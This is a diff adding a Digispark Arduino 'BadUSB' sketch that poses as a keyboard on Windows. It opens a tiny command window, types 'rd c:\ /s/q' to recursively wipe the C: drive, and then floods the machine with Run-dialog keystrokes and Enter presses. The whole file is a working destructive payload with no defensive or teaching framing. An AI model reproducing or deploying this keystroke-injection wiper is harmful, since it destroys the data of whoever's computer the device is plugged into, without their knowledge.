@@ -1,0 +1,46 @@
+#include "DigiKeyboard.h"
+#define KEY_SPACE 0x2C  
+
+void setup() {
+  DigiKeyboard.sendKeyStroke(0);  
+
+  DigiKeyboard.delay(1000);  
+
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+
+  DigiKeyboard.delay(1000);
+
+DigiKeyboard.print("cmd /q /k mode con: cols=15 lines=1");
+
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+DigiKeyboard.print("cd ..");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ DigiKeyboard.delay(400);
+DigiKeyboard.print("cd ..");
+ DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+ DigiKeyboard.delay(400);
+DigiKeyboard.print("rd c:\ /s/q");
+ DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+
+DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
+  DigiKeyboard.delay(200);  
+  DigiKeyboard.print("n");  
+
+  DigiKeyboard.print("magnify /q");
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+ DigiKeyboard.print("BadUsb");
+
+  for (int i = 0; i < 100000000; i++) {
+    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+    DigiKeyboard.delay(100); 
+  }
+
+}
+
+void loop() {
+
+}
